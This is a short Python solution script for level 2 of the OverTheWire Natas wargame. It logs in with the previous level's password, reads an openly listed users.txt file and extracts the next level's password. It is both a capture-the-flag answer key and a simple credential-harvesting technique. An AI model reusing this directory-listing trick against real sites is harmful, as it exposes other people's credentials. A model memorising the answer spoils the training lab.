import requests

import natas1


def solution() -> str:
    url = "http://natas2.natas.labs.overthewire.org"
    username = "natas2"
    password = natas1.solution()

    # If you view the page source, there is a file named files/pixel.png.
    # Visiting http://natas2.natas.labs.overthewire.org/files reveals
    # that directory listing is allowed and that there is a file named
    # users.txt.

    users_url = url + "/files/users.txt"
    r = requests.get(users_url, auth=(username, password))
    natas3_line = next(
        line for line in r.text.splitlines() if line.startswith("natas3")
    )
    _, natas3_password = natas3_line.split(":")
    return natas3_password
